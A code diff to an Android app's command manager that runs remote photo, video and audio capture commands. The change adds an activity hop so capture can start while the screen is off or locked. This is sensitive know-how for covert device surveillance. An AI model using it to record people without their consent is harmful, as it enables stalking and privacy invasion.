@@ -1,8 +1,10 @@
 package com.save.me
 
 import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
+import android.os.PowerManager
 import androidx.core.content.ContextCompat
 import androidx.room.*
 import kotlinx.coroutines.*
@@ -180,6 +182,10 @@ object CommandManager {
         return minutes
     }
 
+    /**
+     * Starts the action using RemoteTriggerActivity only if the screen is off,
+     * otherwise (screen on/unlocked or app foreground/background) uses the direct service approach.
+     */
     private fun startActionInvoke(
         context: Context,
         type: String,
@@ -191,38 +197,81 @@ object CommandManager {
         commandId: Long
     ) {
         when (type) {
-            "photo", "video" -> {
-                val cam = camera ?: "front"
-                val flashEnabled = flash == "true"
-                val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
-                val durationMinutes = normalizeDuration(duration)
-                ForegroundActionService.startCameraAction(
-                    context,
-                    type,
-                    JSONObject().apply {
-                        put("camera", cam)
-                        put("flash", flashEnabled)
-                        put("quality", qualityInt)
-                        put("duration", durationMinutes)
-                    },
-                    chatId,
-                    commandId
-                )
-            }
-            "audio" -> {
-                val durationMinutes = normalizeDuration(duration)
-                ForegroundActionService.startAudioAction(
-                    context,
-                    JSONObject().apply {
-                        put("duration", durationMinutes)
-                    },
-                    chatId,
-                    commandId
-                )
+            "photo", "video", "audio" -> {
+                if (shouldUseScreenOnActivity(context)) {
+                    // Use activity hop for screen-off/locked
+                    val intent = Intent(context, RemoteTriggerActivity::class.java)
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    intent.putExtra("action", type)
+                    if (type == "photo" || type == "video") {
+                        val cam = camera ?: "front"
+                        val flashEnabled = flash == "true"
+                        val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
+                        val durationMinutes = normalizeDuration(duration)
+                        intent.putExtra("camera", cam)
+                        intent.putExtra("flash", flashEnabled)
+                        intent.putExtra("quality", qualityInt)
+                        intent.putExtra("duration", durationMinutes)
+                    }
+                    if (type == "audio") {
+                        val durationMinutes = normalizeDuration(duration)
+                        intent.putExtra("duration", durationMinutes)
+                    }
+                    chatId?.let { intent.putExtra("chat_id", it) }
+                    intent.putExtra("command_id", commandId)
+                    context.startActivity(intent)
+                } else {
+                    // Direct service approach (background or screen on)
+                    when (type) {
+                        "photo", "video" -> {
+                            val cam = camera ?: "front"
+                            val flashEnabled = flash == "true"
+                            val qualityInt = quality?.filter { it.isDigit() }?.toIntOrNull() ?: if (type == "photo") 1080 else 480
+                            val durationMinutes = normalizeDuration(duration)
+                            ForegroundActionService.startCameraAction(
+                                context,
+                                type,
+                                JSONObject().apply {
+                                    put("camera", cam)
+                                    put("flash", flashEnabled)
+                                    put("quality", qualityInt)
+                                    put("duration", durationMinutes)
+                                },
+                                chatId,
+                                commandId
+                            )
+                        }
+                        "audio" -> {
+                            val durationMinutes = normalizeDuration(duration)
+                            ForegroundActionService.startAudioAction(
+                                context,
+                                JSONObject().apply {
+                                    put("duration", durationMinutes)
+                                },
+                                chatId,
+                                commandId
+                            )
+                        }
+                    }
+                }
             }
             else -> {
                 startOtherActionInvoke(context, type, duration, chatId, commandId)
             }
+        }
+    }
+
+    /**
+     * Returns true if the screen is off (do activity hop), else returns false (direct service).
+     */
+    private fun shouldUseScreenOnActivity(context: Context): Boolean {
+        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+        // Use isInteractive for API 20+, isScreenOn for older
+        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
+            !pm.isInteractive
+        } else {
+            @Suppress("DEPRECATION")
+            !pm.isScreenOn
         }
     }
 
@@ -382,7 +431,7 @@ abstract class CommandQueueDatabase : RoomDatabase() {
                     CommandQueueDatabase::class.java,
                     "command_queue_db"
                 )
-                    .fallbackToDestructiveMigration() // <-- this line fixes the migration crash!
+                    .fallbackToDestructiveMigration()
                     .build().also { INSTANCE = it }
             }
         }
